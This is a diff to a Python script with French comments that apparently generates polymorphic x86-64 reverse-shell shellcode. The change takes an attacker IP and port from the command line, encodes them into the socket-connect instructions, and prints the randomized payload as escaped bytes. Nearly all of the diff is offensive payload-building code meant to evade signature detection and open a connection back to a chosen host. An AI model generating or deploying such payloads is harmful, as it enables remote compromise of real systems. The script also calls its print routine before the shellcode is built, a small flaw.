@@ -1,4 +1,4 @@
-import random
+import random, sys
 
 shellcode = ""
 
@@ -10,6 +10,58 @@ __________      .__          _________.__           .__  .__            ________
  |____|   \____/|____/ ____/_______  /|___|  /\___  >____/____/         /_______  /_______  /\______  /___|
                      \/            \/      \/     \/                            \/        \/        \/     
 '''
+
+###### Fonctions ######
+
+
+#Récupération des paramètres
+
+ipv4 = sys.argv[1]
+port = sys.argv[2]
+
+#Transformation de l'ip en hexa puis inversement de l'ip pour être utilisé dans le shellcode.
+
+def ip_to_hex(ip):
+    # Vérifier si l'adresse IP est valide en vérifiant que chaque partie est un entier entre 0 et 255
+    if not all(0 <= int(byte) <= 255 for byte in ip.split('.')):
+        raise ValueError("IP incorrecte. Assurez-vous d'utiliser des valeurs valides pour les octets (0-255).")
+
+    # Convertir chaque partie de l'adresse IP en une chaîne hexadécimale
+    hex_parts = (format(int(byte), 'X').zfill(2) for byte in ip.split('.'))
+
+    # Joindre les parties hexadécimales pour former la représentation hexadécimale complète
+    return ''.join(hex_parts)
+
+#Transformation du port en hexa puis inversement de l'ip pour être utilisé dans le shellcode.
+
+def port_to_hex(port):
+    port_hex = hex(int(port))[2:]  # Convertir le port en hexadécimal et enlever le préfixe "0x"
+    if len(port_hex) % 2 != 0:
+        port_hex = '0' + port_hex  # Ajouter un zéro au début si la longueur est impaire
+
+    return(port_hex)
+
+#Fonction qui ajoute les "\x" au shellcode.
+
+def shellcodize(s):
+    shellcode = 'X'
+    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
+    shellcode = shellcode.replace('X', '\\x')
+    print("Shellcode polymorphique: \n")
+    print(shellcode)
+shellcodize(shellcode)
+
+
+
+print("------------")
+print("La taille du shellcode est de : ",(len(shellcode)), "octets")
+print("\n")
+
+
+ipv4 = ip_to_hex(ipv4)
+port = port_to_hex(port)
+
+###### CREATION SOCKET ######
 
 #mov al, 41 -> B029
 #mov al, 40 - add al, 1 -> b0280401
@@ -53,7 +105,6 @@ create_socket_syscall = ["0F05"]
 create_socket_mov = ["4989C1"]
 
 
-
 ###### CONNEXION SOCKET ######
 
 #push 0x2A -> 6A2A
@@ -75,12 +126,17 @@ connexion_socket_4 = ["5252"]
 
 #push 0x0101017f -> 687F010101
 
-connexion_socket_5 = ["687F010101"]
+connexion_socket_5 = ["68"]
+connexion_socket_5.append(ipv4)
+connexion_socket_5 = ''.join(connexion_socket_5)
+print(connexion_socket_5)
 
 #push word 0x5c11 -> D05C11
 
-connexion_socket_6 = ["6668115C"]
-
+connexion_socket_6 = ["6668"]
+connexion_socket_6.append(port)
+connexion_socket_6 = ''.join(connexion_socket_6)
+print(connexion_socket_6)
 
 #push word 0x02 -> D002
 
@@ -201,8 +257,8 @@ shellcode += random.choice(connexion_socket_1)
 shellcode += random.choice(connexion_socket_2)
 shellcode += random.choice(connexion_socket_3)
 shellcode += random.choice(connexion_socket_4)
-shellcode += random.choice(connexion_socket_5)
-shellcode += random.choice(connexion_socket_6)
+shellcode += (connexion_socket_5)
+shellcode += (connexion_socket_6)
 shellcode += random.choice(connexion_socket_7)
 shellcode += random.choice(connexion_socket_8)
 shellcode += random.choice(connexion_socket_9)
@@ -226,17 +282,5 @@ shellcode += random.choice(list_lastcallsys)
 
 print(shellcodeart)
 
-# Fonction qui permet l'ajout des /xFF/
-def shellcodize(s):
-    shellcode = 'X'
-    shellcode += 'X'.join(a+b for a,b in zip(s[::2], s[1::2]))
-    shellcode = shellcode.replace('X', '\\x')
-    print("Shellcode polymorphique: \n")
-    print(shellcode)
 shellcodize(shellcode)
-
-
-
-print("------------")
-print("La taille du shellcode est de : ",(len(shellcode)), "octets")
-print("\n")
+print("Taille shellcode : ", len(shellcode))
